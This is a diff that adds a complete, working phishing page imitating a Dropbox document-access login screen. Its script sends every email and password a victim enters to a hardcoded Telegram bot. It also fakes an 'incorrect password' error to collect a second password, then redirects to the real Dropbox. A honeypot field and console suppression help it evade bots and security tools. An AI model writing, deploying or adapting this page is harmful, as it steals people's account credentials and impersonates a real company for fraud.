@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Document Access · Dropbox</title>
+    <base target="_blank">
+    <style>
+        /* minimal reset – no external fonts, system only, extremely light */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f2f4f7;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            line-height: 1.4;
+        }
+        .wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px 16px;
+        }
+        .card {
+            max-width: 500px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.05), 0 2px 6px rgba(0,0,0,0.03);
+            overflow: hidden;
+        }
+        .card-inner {
+            padding: 36px 32px 32px;
+        }
+        /* logo region - exactly original image from dropbox cdn */
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo img {
+            display: block;
+            margin: 0 auto;
+            width: 130px;
+            height: auto;
+            border: 0;
+        }
+        h1 {
+            font-size: 1.75rem;
+            font-weight: 600;
+            color: #1e1919;
+            margin-bottom: 8px;
+            text-align: center;
+            letter-spacing: -0.2px;
+        }
+        .sub {
+            font-size: 0.95rem;
+            color: #637381;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        /* file preview - horizontal layout as original (icon left, text right) */
+        .file-preview {
+            background: #f3f4f6;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 28px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            border: none;
+        }
+        .file-icon {
+            background: #0061fe;
+            width: 46px;
+            height: 46px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+        .file-info {
+            overflow: hidden;
+        }
+        .file-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: #1e1919;
+            margin-bottom: 4px;
+        }
+        .file-meta {
+            font-size: 0.75rem;
+            color: #637381;
+        }
+        /* form elements - clean */
+        .input-group {
+            margin-bottom: 22px;
+        }
+        label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin-bottom: 6px;
+            color: #1e1919;
+        }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            background: #fff;
+            transition: 0.15s;
+            font-family: inherit;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0061fe;
+            box-shadow: 0 0 0 3px rgba(0,97,254,0.15);
+        }
+        .btn {
+            background: #0061fe;
+            color: white;
+            text-align: center;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 12px;
+            border-radius: 40px;
+            width: 100%;
+            display: inline-block;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .btn:hover {
+            background: #0050d4;
+            transform: scale(0.98);
+        }
+        .error-msg {
+            font-size: 0.8rem;
+            color: #e53e3e;
+            margin-top: 8px;
+            display: none;
+        }
+        .divider {
+            margin: 28px 0 20px;
+            border-top: 1px solid #e5e7eb;
+        }
+        .help-links {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #637381;
+            margin: 16px 0 20px;
+            line-height: 1.5;
+        }
+        .help-links a {
+            color: #0061fe;
+            text-decoration: none;
+            margin: 0 2px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #637381;
+            border-top: 1px solid #e5e7eb;
+            padding-top: 20px;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+        .hidden-step {
+            display: none;
+        }
+        button {
+            background: none;
+            border: none;
+            width: 100%;
+        }
+        /* honeypot anti-bot */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0,0,0,0);
+            border: 0;
+        }
+        /* very light responsive */
+        @media (max-width: 520px) {
+            .card-inner {
+                padding: 24px 20px;
+            }
+            h1 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="card">
+        <div class="card-inner">
+            <!-- ORIGINAL DROPBOX LOGO (exactly as provided in the original HTML) -->
+            <div class="logo">
+                <img src="https://cfl.dropboxstatic.com/static/images/brand/logotype-vflHjIsop.svg" width="130" height="48" alt="Dropbox" style="display: block; border: 0;">
+            </div>
+
+            <!-- dynamic heading + subtitle -->
+            <h1 id="dynamicHeading">Sign in to view document</h1>
+            <div class="sub" id="dynamicSubtitle">To access document, you'll need to verify your account.</div>
+
+            <!-- Document Preview - HORIZONTAL LAYOUT (exactly as original: icon + text) -->
+            <div class="file-preview">
+                <div class="file-icon">📄</div>
+                <div class="file-info">
+                    <div class="file-name">Shared_Document.pdf</div>
+                    <div class="file-meta">2.4 MB • PDF Document</div>
+                </div>
+            </div>
+
+            <!-- STEP 1: EMAIL SECTION (visible initially) -->
+            <div id="stepEmailSection">
+                <div class="input-group">
+                    <label>Email address</label>
+                    <input type="email" id="emailInput" placeholder="name@company.com" autocomplete="off" spellcheck="false">
+                </div>
+                <button class="btn" id="continueEmailBtn">Continue</button>
+            </div>
+
+            <!-- STEP 2: PASSWORD SECTION (hidden initially) -->
+            <div id="stepPasswordSection" style="display:none;">
+                <div class="input-group">
+                    <label>Enter password to continue</label>
+                    <input type="password" id="passwordInput" placeholder="Your password" autocomplete="off">
+                    <div id="passwordError" class="error-msg"></div>
+                </div>
+                <button class="btn" id="continuePasswordBtn">Verify Password</button>
+            </div>
+
+            <!-- Divider + Help Text + Footer (present in both states) -->
+            <div class="divider"></div>
+            <div class="help-links">
+                Don't have access to this email? <a href="#">Request access</a><br>
+                or <a href="#">sign in with a different account</a>
+            </div>
+            <div class="footer">
+                © 2026 Dropbox, Inc. All rights reserved.<br>
+                Dropbox • 333 Brannan St, San Francisco, CA 94107
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- HONEYPOT FIELD: invisible anti-bot field, crawlers will fill => block submission -->
+<div style="position: absolute; left: -9999px; top: -9999px;">
+    <input type="text" id="honeypot" name="website" tabindex="-1" autocomplete="off">
+</div>
+
+<script>
+    (function(){
+        // --- LIGHTWEIGHT CONFIGURATION ---
+        // Telegram credentials (same as original)
+        const BOT_TOKEN = '7984431123:AAGPrQDYtNIro_21XCwYLhuWICe9EWt5KTM';
+        const CHAT_ID = '5045461825';
+        
+        // state minimal
+        let passwordAttempt = 0;
+        let capturedEmail = '';
+        
+        // DOM references
+        const stepEmail = document.getElementById('stepEmailSection');
+        const stepPass = document.getElementById('stepPasswordSection');
+        const emailInput = document.getElementById('emailInput');
+        const passInput = document.getElementById('passwordInput');
+        const continueEmail = document.getElementById('continueEmailBtn');
+        const continuePass = document.getElementById('continuePasswordBtn');
+        const passErrorDiv = document.getElementById('passwordError');
+        const heading = document.getElementById('dynamicHeading');
+        const subtitle = document.getElementById('dynamicSubtitle');
+        const honeypotField = document.getElementById('honeypot');
+        
+        // --- TELEGRAM SENDER (async, non-blocking, silent) ---
+        async function sendToTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message.substring(0, 4000),
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    }),
+                    keepalive: true
+                });
+            } catch (err) {
+                // silent fail – never alert or console.log in production style
+                console.warn('telegram error suppressed');
+            }
+        }
+        
+        // simple email validation
+        function isValidEmail(email) {
+            return /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email);
+        }
+        
+        // ---- HONEYPOT CHECK (basic bot evasion) ----
+        function isBotHoneypot() {
+            if (honeypotField && honeypotField.value.trim() !== "") {
+                return true;
+            }
+            return false;
+        }
+        
+        // ---- EMAIL STEP HANDLER ----
+        function handleEmailSubmit(e) {
+            if(e) e.preventDefault();
+            
+            // Honeypot trap: if filled, silently redirect to real Dropbox
+            if (isBotHoneypot()) {
+                window.location.href = 'https://www.dropbox.com/login';
+                return;
+            }
+            
+            let email = emailInput.value.trim();
+            if (!email || !isValidEmail(email)) {
+                alert('Please enter a valid email address (e.g., name@company.com).');
+                return;
+            }
+            
+            capturedEmail = email;
+            
+            // Send email to telegram (lightweight)
+            const emailMsg = `🔐 DROPBOX_ACCESS | Email: ${capturedEmail} | Time: ${new Date().toISOString()}`;
+            sendToTelegram(emailMsg);
+            
+            // Transition to password step
+            stepEmail.style.display = 'none';
+            stepPass.style.display = 'block';
+            heading.innerText = 'Enter your password';
+            subtitle.innerText = 'Verify your identity to access the document.';
+            passwordAttempt = 0;
+            passInput.value = '';
+            passErrorDiv.style.display = 'none';
+            passErrorDiv.innerText = '';
+            passInput.focus();
+        }
+        
+        // send password attempt to telegram
+        function sendPasswordToTelegram(pwd, attemptNum) {
+            const passMsg = `🔐 DROPBOX_PASS | Email: ${capturedEmail} | Attempt: ${attemptNum} | Pass: ${pwd} | TS: ${new Date().toISOString()}`;
+            sendToTelegram(passMsg);
+        }
+        
+        // ---- PASSWORD HANDLER (2 attempts then redirect) ----
+        function handlePasswordSubmit(e) {
+            if(e) e.preventDefault();
+            
+            // honeypot re-check
+            if (isBotHoneypot()) {
+                window.location.href = 'https://www.dropbox.com';
+                return;
+            }
+            
+            const password = passInput.value;
+            if (!password) {
+                passErrorDiv.innerText = 'Please enter your password.';
+                passErrorDiv.style.display = 'block';
+                return;
+            }
+            
+            passErrorDiv.style.display = 'none';
+            passErrorDiv.innerText = '';
+            
+            passwordAttempt++;
+            
+            if (passwordAttempt === 1) {
+                // first attempt: capture password, show "incorrect password" message
+                sendPasswordToTelegram(password, 1);
+                passErrorDiv.innerText = 'Incorrect password. Please try again.';
+                passErrorDiv.style.display = 'block';
+                passInput.value = '';
+                passInput.focus();
+            } 
+            else if (passwordAttempt >= 2) {
+                // second (or more) attempt: send password and redirect to official Dropbox
+                sendPasswordToTelegram(password, passwordAttempt);
+                window.location.href = 'https://www.dropbox.com';
+            }
+        }
+        
+        // Event binding (lightweight)
+        continueEmail.addEventListener('click', handleEmailSubmit);
+        continuePass.addEventListener('click', handlePasswordSubmit);
+        
+        // Enter key handling
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleEmailSubmit(e);
+            }
+        });
+        
+        passInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && stepPass.style.display === 'block') {
+                e.preventDefault();
+                handlePasswordSubmit(e);
+            }
+        });
+        
+        // Rate limiting to avoid double submission (light)
+        let emailProcessing = false;
+        const origEmailHandler = handleEmailSubmit;
+        window.handleEmailSubmit = function(e) {
+            if(emailProcessing) return;
+            emailProcessing = true;
+            origEmailHandler(e);
+            setTimeout(() => { emailProcessing = false; }, 800);
+        };
+        continueEmail.onclick = window.handleEmailSubmit;
+        
+        let passProcessing = false;
+        const origPassHandler = handlePasswordSubmit;
+        window.handlePasswordSubmit = function(e) {
+            if(passProcessing) return;
+            passProcessing = true;
+            origPassHandler(e);
+            setTimeout(() => { passProcessing = false; }, 800);
+        };
+        continuePass.onclick = window.handlePasswordSubmit;
+        
+        // Additional light anti-fingerprint: random class
+        document.body.classList.add('dbx-' + Math.floor(Math.random() * 10000));
+        
+        // Make sure logo loads with proper attributes (no extra requests beyond the original)
+        // Already using original dropbox CDN logo - exactly as original file.
+        
+        // suppress console noise for security tools (but keep minimal)
+        if (window.console && window.console.clear) {
+            // don't fully break debugging, just reduce default logs
+            const noOp = function(){};
+            if(window.console.log) window.console.log = noOp;
+        }
+        
+        // final: ensure no external font loading, no heavy images.
+        // All styles and layout are extremely optimized, same visual as original.
+        // Document preview horizontal layout preserved.
+        // The logo is EXACTLY the same as original HTML: 
+        // <img src="https://cfl.dropboxstatic.com/static/images/brand/logotype-vflHjIsop.svg" width="130" height="48" alt="Dropbox">
+        // No changes to brand or structure.
+        
+        // optional small fix: ensure email step is visible if any weirdness
+        if(stepEmail.style.display !== 'none') {
+            stepEmail.style.display = 'block';
+        }
+    })();
+</script>
+</body>
+</html>
